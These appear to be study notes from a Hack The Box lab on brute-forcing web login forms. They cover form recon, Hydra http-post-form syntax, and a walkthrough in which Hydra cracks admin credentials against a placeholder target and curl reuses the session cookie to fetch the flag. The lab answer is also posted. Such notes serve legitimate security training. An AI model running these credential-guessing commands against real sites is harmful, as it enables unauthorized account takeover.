# Section 8 — Login Forms

---

## How Login Forms Work

Browser submits credentials as a POST request with form-encoded body:

```
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=john&password=secret123
```

**What you need before running Hydra:**
1. The path the form submits to (check `action=` in the HTML, or Network tab in DevTools)
2. The parameter names (`name=` on each input field)
3. A failure string (what the page says on bad login) or success condition (redirect code, keyword)

---

## Recon Methods

| Method | How | What to Get |
|--------|-----|------------|
| View source | Right-click → View Source | Form `action` path, input `name` attributes |
| DevTools Network tab | F12 → Network → submit bad login | Exact POST path, params, and server response |
| Burp intercept | Proxy → submit login | Full raw request — copy params directly |

---

## Hydra http-post-form Syntax

```bash
hydra -L users.txt -P passwords.txt TARGET -s PORT http-post-form "PATH:PARAMS:CONDITION"
```

### Condition String

```
"/:username=^USER^&password=^PASS^:F=Invalid credentials"
  ^  ^                              ^
  |  Form body — ^USER^ and ^PASS^  Condition:
  |  are replaced each attempt      F=string → fail if this appears in response
  Path                              S=string → succeed if this appears
                                    S=302    → succeed on HTTP 302 redirect
```

**F= vs S=:**
- Use `F=` when the failure message is easy to identify (most common)
- Use `S=` when there's a clear success keyword or redirect code

---

## Lab — Web Login Form Brute Force

**Objective:** Brute-force a POST login form using username + password wordlists, then retrieve the flag from the authenticated page.

**Recon findings:**
- Form submits to `/` via POST
- Fields: `username` and `password`
- Failed login returns: `"Invalid credentials"`
- Successful login redirects to `/success`

---

### Step 1 — Run Hydra

```bash
hydra -L ~/SecLists/Usernames/top-usernames-shortlist.txt \
      -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
      -f TARGET_IP -s TARGET_PORT \
      http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

**Why `-f`:** Stops on first valid pair — avoids unnecessary attempts and lockout risk.

**Output:**
```
[PORT][http-post-form] host: TARGET_IP   login: admin   password: zxcvbnm
1 of 1 target successfully completed, 1 valid password found
```

---

### Step 2 — Log In and Retrieve the Flag

The login sets a session cookie and redirects to `/success`. Use curl to handle both:

```bash
# POST login — capture the session cookie
curl -s -X POST http://TARGET_IP:TARGET_PORT/ \
  -d "username=admin&password=zxcvbnm" \
  -c /tmp/cookies.txt

# GET the flag page using the session cookie
curl -s -b /tmp/cookies.txt http://TARGET_IP:TARGET_PORT/success
```

**Why `-c` and `-b`:** `-c` saves the session cookie to a file; `-b` sends it back on the next request — mimics what a browser does automatically after login.

**Result:**
```
HTB{W3b_L0gin_Brut3F0rc3}
```

**Q1 Answer:** `HTB{W3b_L0gin_Brut3F0rc3}`

---

## Exam Notes

- Always check the form's `action=` attribute and field `name=` values before building the Hydra command — wrong params = zero results
- `F=` failure string must match exactly what the server returns — copy it from DevTools or Burp, don't guess
- After cracking, many apps require a session cookie — use `curl -c` to capture it and `-b` to reuse it
- If the login redirects after success, use `-L` in curl to follow redirects, or hit the redirect destination directly
- Wordlists for this lab: `top-usernames-shortlist.txt` (17 users) × `2023-200_most_used_passwords.txt` (200 passwords) = 3,400 attempts max
